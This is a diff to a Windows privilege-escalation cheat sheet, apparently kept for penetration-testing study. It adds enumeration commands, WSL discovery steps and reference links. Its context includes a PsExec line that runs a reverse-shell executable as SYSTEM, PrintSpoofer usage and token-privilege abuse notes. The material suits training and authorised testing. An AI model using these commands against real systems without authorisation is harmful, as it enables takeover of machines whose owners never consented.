@@ -20,7 +20,7 @@
   * [Installed applications](#Installed-applications)
   * [Hot potato](#Hot-potato)
   * [Token impersonation](#Token-impersonation)
-  * [Always Install Elevated](#Always-Install-Elevated)
+  * [Linux Subsystem](#Linux-Subsystem)
 * [UAC bypass](#UAC-bypass) 
 
 ## General tips
@@ -37,6 +37,12 @@
   - Admin --> System
     - ```.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe```
     - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+
+#### Other great sources
+- https://www.fuzzysecurity.com/tutorials/16.html
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
 
 ## Tools
 #### Priveschk
@@ -86,9 +92,24 @@ accesschk.exe /accepteula
 whoami
 ```
 
+#### Check the current privs
+```
+whoami /priv
+```
+
+#### Check the current groups
+```
+whoami /groups
+```
+
 #### Check all the users
 ```
 net user
+```
+
+#### Check the local administrator group members
+```
+net localgroup administrators
 ```
 
 #### Check hostname
@@ -101,6 +122,11 @@ hostname
 systeminfo
 ```
 
+#### Get installed patches
+```
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+
 #### Check Running processes
 ```
 tasklist /svc
@@ -109,11 +135,6 @@ tasklist /svc
 #### Check running services
 ```
 wmic service get name,displayname,pathname,startmode
-```
-
-#### Check permission on file
-```
-icalcs "<PATH>"
 ```
 
 #### Check current privileges
@@ -135,6 +156,7 @@ netstat -ano
 
 #### Enumerate firewall
 ```
+netsh firewall show state
 netsh advfirewall show currentprofile
 netsh advfirewall firewall show rule name=all
 ```
@@ -183,8 +205,18 @@ driverquery /v
 cd C:\Program Files\<DRIVER>
 ```
 
+#### List disks
+```
+wmic logicaldisk get caption,description,providername
+```
+
+#### Check permission on file
+```
+icalcs "<PATH>"
+```
+
 ## Privilege escalation techniques
-Run winPEAS and if it find something fuzzy use these techniques to exploit it.
+- Run automation scripts and if it find something fuzzy use these techniques to exploit it.
 
 ## History
 #### Search for powershell history and transcript
@@ -667,6 +699,7 @@ C:\PrintSpoofer.exe -i -c cmd.exe
 
 ### User privileges
 - https://github.com/hatRiot/token-priv
+- https://github.com/gtworek/Priv2Admin
 In Windows, user accounts and groups can be assigned specific “privileges”. These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
 
 #### Check privileges
@@ -686,6 +719,23 @@ whoami /priv
 - SeTakeOwnershipPrivilege
   - The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.
 
+### Alternate Datastream
+- https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
+ 
+### Linux Subsystem
+#### Look for bash.exe or wsl.exe
+```
+where /R C:\windows bash.exe
+where /R C:\windows wsl.exe
+```
+ 
+#### Run bash or wsl.exe
+```
+<PATH TO .EXE>\bash.exe whoami
+<PATH TO .EXE>\bash.exe
+```
+
+ 
 ## UAC bypass
 - A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.
 - https://github.com/hfiref0x/UACME
